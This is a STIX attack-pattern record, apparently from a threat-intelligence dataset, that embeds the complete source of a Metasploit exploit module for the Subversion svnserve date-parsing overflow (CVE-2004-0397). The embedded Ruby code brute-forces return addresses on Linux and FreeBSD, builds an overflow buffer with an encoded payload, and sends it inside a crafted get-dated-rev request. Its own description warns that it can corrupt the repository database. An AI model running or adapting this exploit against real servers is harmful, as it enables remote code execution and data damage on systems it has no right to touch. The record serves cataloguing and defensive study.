{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5ddd707c-8d27-464e-988d-6955f61cfd34",
    "created": "2024-08-14T17:07:15.328026Z",
    "modified": "2024-08-14T17:07:15.328031Z",
    "name": "Subversion Date Svnserve",
    "description": " This is an exploit for the Subversion date parsing overflow.  This exploit is for the svnserve daemon (svn:// protocol) and will not work for Subversion over webdav (http[s]://).  This exploit should never crash the daemon, and should be safe to do multi-hits.  **WARNING** This exploit seems to (not very often, I've only seen it during testing) corrupt the subversion database, so be careful! ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/svn/svnserve_date.rb",
            "external_id": "svnserve_date.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0397"
        },
        {
            "source_name": "reference",
            "url": "http://lists.netsys.com/pipermail/full-disclosure/2004-May/021737.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Brute\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Subversion Date Svnserve',\n      'Description'    => %q{\n          This is an exploit for the Subversion date parsing overflow.  This\n        exploit is for the svnserve daemon (svn:// protocol) and will not work\n        for Subversion over webdav (http[s]://).  This exploit should never\n        crash the daemon, and should be safe to do multi-hits.\n\n        **WARNING** This exploit seems to (not very often, I've only seen\n        it during testing) corrupt the subversion database, so be careful!\n      },\n      'Author'         => 'spoonm',\n      'References'     =>\n        [\n          ['CVE', '2004-0397'],\n          ['OSVDB', '6301'],\n          ['BID',\t'10386'],\n          ['URL',   'http://lists.netsys.com/pipermail/full-disclosure/2004-May/021737.html']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\",\n          'MinNops'  => 16,\n        },\n      'SaveRegisters'  => [ 'esp' ],\n      'Arch'           => 'x86',\n      'Platform'       => %w{ bsd linux },\n      'Targets'        =>\n        [\n          [\n            'Linux Bruteforce',\n            {\n              'Platform'   => 'linux',\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xbffffe13 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 0\n                }\n            },\n          ],\n          [\n            'FreeBSD Bruteforce',\n            {\n              'Platform'   => 'bsd',\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xbfbffe13 },\n                  'Stop'  => { 'Ret' => 0xbfbf0000 },\n                  'Step'  => 0\n                }\n            },\n          ],\n\n        ],\n      'DisclosureDate' => '2004-05-19'))\n\n    register_options(\n      [\n        Opt::RPORT(3690),\n        OptString.new('URL', [ true, \"SVN URL (ie svn://host/repos)\", \"svn://host/svn/repos\" ])\n      ])\n\n    register_advanced_options(\n      [\n        # 62 on spoonm's, 88 on HD's\n        OptInt.new('RetLength', [ false, \"Length of rets after payload\", 100 ]),\n        OptBool.new('IgnoreErrors', [ false, \"Ignore errors\", false ])\n      ])\n  end\n\n  def brute_exploit(addresses)\n    connect\n\n    print_status(\"Trying #{\"%.8x\" % addresses['Ret']}...\")\n\n    buffer = ([addresses['Ret']].pack('V') * (datastore['RetLength'] / 4).to_i) + payload.encoded\n\n    [\n      \"( 2 ( edit-pipeline ) \" + lengther(datastore['URL']) + \" ) \",\n      \"( ANONYMOUS ( 0; ) )\",\n      \"( get-dated-rev ( \" + lengther(buffer + \" 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off)\") + \" ) ) \"\n    ].each_with_index { |buf, index|\n      trash = sock.get_once\n\n      print_line(\"Received: #{trash}\") if debugging?\n\n      if (sock.put(buf) || 0) == 0 and index < 3\n        print_error(\"Error transmitting buffer.\")\n        fail_with(Failure::Unknown, \"Failed to transmit data\") if !datastore['IgnoreErrors']\n      end\n\n      if index == 3 and trash.length > 0\n        print_error(\"Received data when we shouldn't have\")\n        fail_with(Failure::Unknown, \"Received data when it wasn't expected\") if !datastore['IgnoreErrors']\n      end\n    }\n\n    handler\n    disconnect\n  end\n\n  def lengther(buf)\n    \"#{buf.length}:\" + buf\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-05-19",
    "x_mitre_platforms": [
        "bsd'"
    ]
}